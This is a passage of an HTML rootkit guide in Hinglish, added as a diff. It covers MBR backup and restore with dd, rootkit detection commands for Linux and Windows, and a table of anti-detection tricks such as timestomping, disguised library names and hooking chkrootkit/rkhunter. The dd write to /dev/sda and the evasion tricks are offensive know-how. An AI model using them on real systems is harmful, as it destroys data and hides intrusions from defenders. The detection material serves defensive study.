+        <div class="cb"><pre><span class="cm"># MBR backup le lo (test lab mein):</span>
+dd if=/dev/sda of=mbr_backup.bin bs=512 count=1
+
+<span class="cm"># MBR read karo:</span>
+xxd /dev/sda | head -32
+<span class="cm"># First 446 bytes = bootloader code</span>
+<span class="cm"># 446-510 = partition table</span>
+<span class="cm"># 510-512 = boot signature (0x55AA)</span>
+
+<span class="cm"># MBR restore karo (agar needed):</span>
+dd if=mbr_backup.bin of=/dev/sda bs=512 count=1
+<span class="cm"># CAUTION: SIRF authorized lab VMs mein</span></pre>
+        </div>
+      </div>
+    </div>
+    <div class="note r">Bootkit development expert-level skill hai — assembly, OS boot process, UEFI internals sab samajhna padta hai. Red Team mein practically bootkit likhne ki zaroorat bahut kam hoti hai — existing tools study karna zyada useful hai. Ye section sirf concept ke liye hai.</div>
+  </div>
+
+  <!-- 9 -->
+  <div class="pdiv"><span class="lbl" style="color:var(--c1)">Detection — Rootkit Kaise Pakdein</span><div class="ln"></div></div>
+  <div class="section" id="s9">
+    <div class="sh"><span class="sn">09</span><h2>Rootkit Detection Methods</h2><span class="stag" style="color:var(--c1);background:rgba(255,79,123,.08);border:1px solid rgba(255,79,123,.3)">Defense Side</span></div>
+    <p class="d">Red Teamer ko detection bhi samajhna chahiye — isse better rootkits bana sakte hain aur Blue Team ke saath Purple Team exercises mein help milti hai.</p>
+
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Linux</span><span class="ct">LD_PRELOAD Rootkit Detect karo</span></div>
+        <div class="cb"><pre><span class="cm"># /etc/ld.so.preload check karo:</span>
+cat /etc/ld.so.preload
+
+<span class="cm"># LD_PRELOAD environment variable:</span>
+echo $LD_PRELOAD
+
+<span class="cm"># Strace se library calls dekho:</span>
+strace -e trace=openat ls 2>&1 | grep preload
+
+<span class="cm"># Chkrootkit tool:</span>
+apt install chkrootkit
+chkrootkit
+
+<span class="cm"># Rkhunter (Rootkit Hunter):</span>
+apt install rkhunter
+rkhunter --check</pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Linux</span><span class="ct">LKM Rootkit Detect karo</span></div>
+        <div class="cb"><pre><span class="cm"># /proc/modules vs lsmod compare karo:</span>
+cat /proc/modules | wc -l
+lsmod | wc -l
+<span class="cm"># Difference = hidden modules</span>
+
+<span class="cm"># Dmesg mein suspicious module loads:</span>
+dmesg | grep -i "module\|insmod\|rmmod"
+
+<span class="cm"># Volatility memory forensics (advanced):</span>
+volatility -f memory.dmp linux_lsmod
+<span class="cm"># Hidden modules memory mein dikh jaate hain</span></pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Windows</span><span class="ct">Windows Rootkit Detect karo</span></div>
+        <div class="cb"><pre><span class="cm"># GMER tool — kernel rootkit scanner:</span>
+<span class="cm"># gmer.exe download karke run karo — hidden processes, drivers detect karta hai</span>
+
+<span class="cm"># Autoruns (Sysinternals) — all persistence locations:</span>
+autoruns.exe /accepteula
+
+<span class="cm"># Process Hacker — hidden process detect:</span>
+<span class="cm"># Options → Scan for hidden processes</span>
+
+<span class="cm"># Windows Defender Offline Scan:</span>
+<span class="cm"># Settings → Windows Security → Virus scan → Offline scan</span></pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 10 -->
+  <div class="section" id="s10">
+    <div class="sh"><span class="sn">10</span><h2>Anti-Detection Tricks</h2><span class="stag" style="color:var(--c5);background:rgba(167,139,255,.08);border:1px solid rgba(167,139,255,.3)">Stealth</span></div>
+
+    <table>
+      <tr><th>Trick</th><th>Kaise</th></tr>
+      <tr><td>Rootkit library ko legitimate naam do</td><td><code class="il">libaudit.so.0</code>, <code class="il">libpam.so.1</code> — normal system library jaisa naam</td></tr>
+      <tr><td>Timestamps match karo</td><td><code class="il">touch -r /bin/ls /lib/librootkit.so</code> — same timestamp de do legitimate file ka</td></tr>
+      <tr><td>Chkrootkit/rkhunter ko bhi hook karo</td><td>Detection tools ke signature strings ko bhi intercept karke filter karo</td></tr>
+      <tr><td>Module ko kernel tree mein rakh do</td><td><code class="il">/lib/modules/$(uname -r)/kernel/drivers/</code> — legitimate location</td></tr>
+      <tr><td>Timestomping (Windows)</td><td>Malicious file ka timestamp legitimate file jaisa karo</td></tr>
+      <tr><td>Size match karo</td><td>Rootkit binary ka size original binary jaisa rakh do</td></tr>
+    </table>
+
+    <div class="note g">Sabse important anti-detection trick: <strong>minimum footprint</strong> — sirf wo karo jo zaroorat hai. Zyada hooking = zyada chance of detection. Simple backdoor + basic hiding often beats complex rootkit jo bugs se detect ho jaata hai.</div>
+  </div>
+
+  <div class="note r">
+    <strong>Authorization mandatory:</strong> Rootkit development aur deployment sirf authorized Red Team engagement mein aur dedicated lab environment mein karo. Real unauthorized systems pe deploy karna serious criminal offense hai. Ye knowledge defensive security (Blue Team) ke liye bhi equally important hai — samajhna ki attacker kya kar sakta hai, taaki defend kiya ja sake.
+  </div>
+
+</main>
+
+<footer>
+  Complete Rootkit Guide · All Types · Scripts & Commands · Read after OSCP prep · Karan's Reference Vault
+</footer>
+</body>
+</html>
